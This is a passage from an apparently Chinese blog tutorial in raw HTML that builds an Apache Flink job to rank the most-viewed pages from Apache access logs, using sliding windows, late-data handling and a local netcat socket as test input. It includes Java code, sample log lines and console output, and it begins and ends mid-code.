OutputTag&lt;ApacheLogEvent&gt;(<span class="string">&quot;late&quot;</span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分组开窗聚合</span></span><br><span class="line">    SingleOutputStreamOperator&lt;PageViewCount&gt; windowAggStream = dataStream</span><br><span class="line">      <span class="comment">// 过滤get请求</span></span><br><span class="line">      .filter(data -&gt; <span class="string">&quot;GET&quot;</span>.equals(data.getMethod()))</span><br><span class="line">      .filter(data -&gt; &#123;</span><br><span class="line">        String regex = <span class="string">&quot;^((?!\\.(css|js|png|ico)$).)*$&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> Pattern.matches(regex, data.getUrl());</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="comment">// 按照url分组</span></span><br><span class="line">      .keyBy(ApacheLogEvent::getUrl)</span><br><span class="line">      .window(SlidingEventTimeWindows.of(Time.minutes(<span class="number">10</span>), Time.seconds(<span class="number">5</span>)))</span><br><span class="line">      .allowedLateness(Time.minutes(<span class="number">1</span>))</span><br><span class="line">      .sideOutputLateData(lateTag)</span><br><span class="line">      .aggregate(<span class="keyword">new</span> PageCountAgg(), <span class="keyword">new</span> PageCountResult());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    windowAggStream.print(<span class="string">&quot;agg&quot;</span>);</span><br><span class="line">    windowAggStream.getSideOutput(lateTag).print(<span class="string">&quot;late&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 收集同一窗口count数据，排序输出</span></span><br><span class="line">    DataStream&lt;String&gt; resultStream = windowAggStream</span><br><span class="line">      .keyBy(PageViewCount::getWindowEnd)</span><br><span class="line">      .process(<span class="keyword">new</span> TopNHotPages(<span class="number">3</span>));</span><br><span class="line"></span><br><span class="line">    resultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;hot pages job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 自定义预聚合函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PageCountAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">ApacheLogEvent</span>, <span class="title">Long</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(ApacheLogEvent value, Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的窗口函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PageCountResult</span> <span class="keyword">implements</span> <span class="title">WindowFunction</span>&lt;<span class="title">Long</span>, <span class="title">PageViewCount</span>, <span class="title">String</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(String url, TimeWindow window, Iterable&lt;Long&gt; input, Collector&lt;PageViewCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      out.collect(<span class="keyword">new</span> PageViewCount(url, window.getEnd(), input.iterator().next()));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的处理函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TopNHotPages</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">PageViewCount</span>, <span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer topSize;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TopNHotPages</span><span class="params">(Integer topSize)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.topSize = topSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义状态，保存当前所有PageViewCount到list中</span></span><br><span class="line">    ListState&lt;PageViewCount&gt; pageViewCountListState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      pageViewCountListState = getRuntimeContext().getListState(<span class="keyword">new</span> ListStateDescriptor&lt;PageViewCount&gt;(<span class="string">&quot;page-count-list&quot;</span>, PageViewCount.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(PageViewCount value, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      pageViewCountListState.add(value);</span><br><span class="line">      ctx.timerService().registerEventTimeTimer(value.getWindowEnd() + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      ArrayList&lt;PageViewCount&gt; pageViewCounts = Lists.newArrayList(pageViewCountListState.get().iterator());</span><br><span class="line"></span><br><span class="line">      pageViewCounts.sort((a, b) -&gt; -Long.compare(a.getCount(), b.getCount()));</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 格式化成String输出</span></span><br><span class="line">      StringBuilder resultBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;============================&quot;</span>).append(System.lineSeparator());</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;窗口结束时间：&quot;</span>).append(<span class="keyword">new</span> Timestamp(timestamp - <span class="number">1</span>)).append(System.lineSeparator());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 遍历列表，取top n输出</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Math.min(topSize, pageViewCounts.size()); i++) &#123;</span><br><span class="line">        PageViewCount pageViewCount = pageViewCounts.get(i);</span><br><span class="line">        resultBuilder.append(<span class="string">&quot;NO &quot;</span>).append(i + <span class="number">1</span>).append(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">          .append(<span class="string">&quot; 页面URL = &quot;</span>).append(pageViewCount.getUrl())</span><br><span class="line">          .append(<span class="string">&quot; 浏览量 = &quot;</span>).append(pageViewCount.getCount())</span><br><span class="line">          .append(System.lineSeparator());</span><br><span class="line">      &#125;</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;===============================&quot;</span>).append(System.lineSeparator());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 控制输出频率</span></span><br><span class="line">      Thread.sleep(<span class="number">1000L</span>);</span><br><span class="line"></span><br><span class="line">      out.collect(resultBuilder.toString());</span><br><span class="line"></span><br><span class="line">      pageViewCountListState.clear();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 启动本地socket  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk 7777</span><br></pre></td></tr></table></figure></li><li><p>在本地socket输入数据，查看输出 </p><ul><li><p> 输入  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">83.149.9.216 - - 17/05/2015:10:25:49 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:50 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:51 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:52 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:55 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:56 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:56 +0000 GET /present</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:57 +0000 GET /present</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:26:01 +0000 GET /</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:26:02 +0000 GET /pre</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:46 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:26:02 +0000 GET /pre</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:26:03 +0000 GET /pre</span><br></pre></td></tr></table></figure></li><li><p> 输出<br><em>由于</em><code>_onTimer_</code><em>简单粗暴直接</em><code>_pageViewCountListState.clear();_</code><em>导致前面几次排名信息中丢失第一名以外的数据 =&gt; 下面代码3-乱序数据代码改进 中解决问题</em>  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829549000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829550000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829551000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829552000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829555000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829556000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829556000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/present&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829557000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/present&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829561000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829562000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/pre&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829546000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829562000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/pre&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;/presentations/&#x27;</span>, windowEnd=1431829550000, count=2&#125;</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;/presentations/&#x27;</span>, windowEnd=1431829555000, count=5&#125;</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;/presentations/&#x27;</span>, windowEnd=1431829560000, count=7&#125;</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;/present&#x27;</span>, windowEnd=1431829560000, count=2&#125;</span></span><br><span class="line">============================</span><br><span class="line">窗口结束时间：2015-05-17 10:25:50.0</span><br><span class="line">NO 1: 页面URL = /presentations/ 浏览量 = 2</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">============================</span><br><span class="line">窗口结束时间：2015-05-17 10:25:55.0</span><br><span class="line">NO 1: 页面URL = /presentations/ 浏览量 = 5</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">============================</span><br><span class="line">窗口结束时间：2015-05-17 10:26:00.0</span><br><span class="line">NO 1: 页面URL = /presentations/ 浏览量 = 7</span><br><span class="line">NO 2: 页面URL = /present 浏览量 = 2</span><br><span class="line">===============================</span><br></pre></td></tr></table></figure></li></ul></li></ul><h6 id="代码3-乱序数据-代码改进"><a href="#代码3-乱序数据-代码改进" class="headerlink" title="代码3-乱序数据-代码改进"></a>代码3-乱序数据-代码改进</h6><p><strong>一个数据只有不属于任何窗口了，才会被丢进侧输出流！</strong></p><hr><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.ApacheLogEvent;</span><br><span class="line"><span class="keyword">import</span> beans.PageViewCount;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.compress.utils.Lists;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.MapState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.MapStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.WindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.OutputTag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Timestamp;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 1:27 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HotPages</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取文件，转换成POJO</span></span><br><span class="line">    <span class="comment">//        URL resource = HotPages.class.getResource(&quot;/apache.log&quot;);</span></span><br><span class="line">    <span class="comment">//        DataStream&lt;String&gt; inputStream = env.readTextFile(resource.getPath());</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方便测试，使用本地Socket输入数据</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    DataStream&lt;ApacheLogEvent&gt; dataStream = inputStream</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        SimpleDateFormat simpleDateFormat = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;dd/MM/yyyy:HH:mm:ss&quot;</span>);</span><br><span class="line">        Long timestamp = simpleDateFormat.parse(fields[<span class="number">3</span>]).getTime();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ApacheLogEvent(fields[<span class="number">0</span>], fields[<span class="number">1</span>], timestamp, fields[<span class="number">5</span>], fields[<span class="number">6</span>]);</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;ApacheLogEvent&gt;(Time.of(<span class="number">1</span>, TimeUnit.SECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(ApacheLogEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    dataStream.print(<span class="string">&quot;data&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个侧输出流标签</span></span><br><span class="line">    OutputTag&lt;ApacheLogEvent&gt; lateTag = <span class="keyword">new</span> OutputTag&lt;ApacheLogEvent&gt;(<span class="string">&quot;late&quot;</span>) &#123;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分组开窗聚合</span></span><br><span class="line">    SingleOutputStreamOperator&lt;PageViewCount&gt; windowAggStream = dataStream</span><br><span class="line">      <span class="comment">// 过滤get请求</span></span><br><span class="line">      .filter(data -&gt; <span class="string">&quot;GET&quot;</span>.equals(data.getMethod()))</span><br><span class="line">      .filter(data -&gt; &#123;</span><br><span class="line">        String regex = <span class="string">&quot;^((?!\\.(css|js|png|ico)$).)*$&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> Pattern.matches(regex, data.getUrl());</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="comment">// 按照url分组</span></span><br><span class="line">      .keyBy(ApacheLogEvent::getUrl)</span><br><span class="line">      .window(SlidingEventTimeWindows.of(Time.minutes(<span class="number">10</span>), Time.seconds(<span class="number">5</span>)))</span><br><span class="line">      .allowedLateness(Time.minutes(<span class="number">1</span>))</span><br><span class="line">      .sideOutputLateData(lateTag)</span><br><span class="line">      .aggregate(<span class="keyword">new</span> PageCountAgg(), <span class="keyword">new</span> PageCountResult());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    windowAggStream.print(<span class="string">&quot;agg&quot;</span>);</span><br><span class="line">    windowAggStream.getSideOutput(lateTag).print(<span class="string">&quot;late&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 收集同一窗口count数据，排序输出</span></span><br><span class="line">    DataStream&lt;String&gt; resultStream = windowAggStream</span><br><span class="line">      .keyBy(PageViewCount::getWindowEnd)</span><br><span class="line">      .process(<span class="keyword">new</span> TopNHotPages(<span class="number">3</span>));</span><br><span class="line"></span><br><span class="line">    resultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;hot pages job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 自定义预聚合函数</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PageCountAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">ApacheLogEvent</span>, <span class="title">Long</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(ApacheLogEvent value, Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 